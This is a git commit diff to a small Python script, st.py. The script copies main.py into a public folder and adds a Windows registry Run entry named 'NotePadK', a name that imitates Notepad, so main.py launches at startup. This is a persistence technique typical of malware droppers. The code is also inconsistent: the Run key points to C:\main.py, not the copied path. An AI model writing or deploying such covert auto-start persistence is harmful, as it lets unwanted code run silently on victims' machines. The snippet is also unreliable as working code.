fb67e82140689b652837503f58a4b945a52786eb
Kokolor <107946897+Kokolor@users.noreply.github.com>
2023-01-14 11:21:14 +0100

    Update st.py

--- st.py
+++ st.py
@@ -1,4 +1,4 @@
 import os
 
-copy main.py C:\
+os.system('copy main.py C:\Users\Public\main.py')
 os.system(r'reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "NotePadK" /t REG_SZ /d "C:\main.py"')
